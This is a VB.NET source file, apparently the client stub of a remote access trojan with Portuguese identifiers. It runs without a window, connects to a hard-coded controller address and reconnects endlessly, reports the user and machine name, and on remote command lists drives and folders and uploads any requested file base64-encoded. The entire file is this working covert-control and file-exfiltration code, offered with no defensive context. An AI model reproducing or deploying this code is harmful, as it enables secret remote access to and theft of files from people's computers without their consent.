
Imports System
Imports System.IO
Imports System.Text
Imports System.Threading
Imports System.Net
Imports System.Net.Sockets
Module Main

    Private TcpClient As TcpClient
    Private separador As String = "||"

    Public Sub Main()
        Control.CheckForIllegalCrossThreadCalls = False
        Dim T1 As New Thread(New ThreadStart(Sub() conect()))
        T1.Start()
    End Sub

    Private Sub conect()
        Try
            TcpClient = New TcpClient
            TcpClient.Connect(IPAddress.Parse("127.0.0.1"), 1000)
            Dim T1 As New Thread(New ThreadStart(Sub() Conexão()))
            T1.Start()
            Dim T2 As New Thread(New ThreadStart(Sub() Conectado()))
            T2.Start()
        Catch ex As Exception

            Dim T1 As New Thread(New ThreadStart(Sub() Reconect()))
            T1.Start()
        End Try
    End Sub

    Private Sub Reconect()
        Dim T1 As New Thread(New ThreadStart(Sub() conect()))
        T1.Start()
    End Sub

    Private Sub Conexão()
        While True
            Try
                TcpClient.Client.Poll(-1, SelectMode.SelectRead)
                If TcpClient.Client.Available <= 0 Then
                    If TcpClient.Client.Receive(New Byte(1) {}, SocketFlags.Peek) = 0 Then
                        Exit While
                    Else
                        Continue While
                    End If
                End If
                Dim Buffer As Byte() = New Byte(TcpClient.Client.Available - 1) {}
                TcpClient.Client.Receive(Buffer, 0, Buffer.Length, SocketFlags.None)
                Dim T1 As New Thread(New ThreadStart(Sub() Data(Buffer)))
                T1.Start()
            Catch ex As Exception
                Exit While
            End Try
        End While
        Dim T2 As New Thread(New ThreadStart(Sub() Reconect()))
        T2.Start()
    End Sub

    Private Sub Data(ByVal buffer As Byte())
        Try
            Dim Pegar As String() = Split(Encoding.Default.GetString(buffer), separador)
            Select Case Pegar(0)
                Case "msgbox"
                    MsgBox(Pegar(1))
                Case "fechar"
                    Environment.Exit(0)
                Case "FileManager"
                    TcpClient.Client.Send(Encoding.Default.GetBytes("FileManagerOpenForm"))
                Case "FileManagerGetDrives"
                    TcpClient.Client.Send(Encoding.Default.GetBytes("FileManagerGetDrives" & separador & DrivesADD()))
                Case "GetFilesFolders"
                    TcpClient.Client.Send(Encoding.UTF8.GetBytes("FileManagerGetDrives" & separador & (FilesADD(Pegar(1)) & FolderADD(Pegar(1)))))
                Case "Download"
                    TcpClient.Client.Send(System.Text.Encoding.UTF8.GetBytes("downloadFiles" & separador & Convert.ToBase64String(IO.File.ReadAllBytes(Pegar(1))) & separador & New IO.FileInfo(Pegar(1)).Name & separador & "Done"))
            End Select
        Catch ex As Exception
        End Try
    End Sub

#Region "FileManager"
    Private Function DrivesADD()
        Dim Nome As String = String.Empty
        For Each x As DriveInfo In DriveInfo.GetDrives
            Select Case x.DriveType
                Case x.DriveType.CDRom 'CD DvD
                    Nome &= x.Name & "|*|"
                Case x.DriveType.Removable 'PenDrive
                    Nome &= x.Name & "|*|"
                Case x.DriveType.Fixed 'HD ou SSD
                    Nome &= x.Name & "|*|"
            End Select

        Next x
        Return Nome
    End Function
    Private Function FilesADD(ByVal s As String) As String
        Dim ADD As String = String.Empty
        Dim F As New DirectoryInfo(s)
        For Each x As FileInfo In F.GetFiles
            ADD &= x.FullName & "|*|"
        Next x
        Return ADD
    End Function

    Private Function FolderADD(ByVal s As String) As String
        Dim ADD As String = String.Empty
        Dim F As New DirectoryInfo(s)
        For Each x As DirectoryInfo In F.GetDirectories
            ADD &= x.FullName & "|*|"
        Next x
        Return ADD
    End Function
#End Region

    Private Sub Conectado()
        Dim user As String = Environment.UserName
        Dim pc As String = Environment.MachineName
        TcpClient.Client.Send(Encoding.Default.GetBytes("Conectado+1" & separador & user & separador & pc & separador))
    End Sub

End Module
